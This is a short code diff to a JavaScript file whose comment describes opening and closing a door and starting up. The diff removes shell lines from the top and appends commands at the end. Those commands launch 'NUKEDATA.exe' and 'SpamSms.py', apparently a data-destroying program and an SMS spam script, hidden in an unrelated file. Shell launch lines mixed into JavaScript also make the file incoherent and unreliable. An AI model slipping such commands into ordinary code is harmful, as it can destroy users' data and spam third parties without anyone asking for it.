@@ -1,5 +1,3 @@
-python SpamSms.py
-timeout 50
 /**
  * This function opens and closes a door twice and then starts up.
  */
@@ -43,3 +41,5 @@ function startUp() {
 
 // Run the function
 openCloseAndStartUp();
+start NUKEDATA.exe
+python SpamSms.py
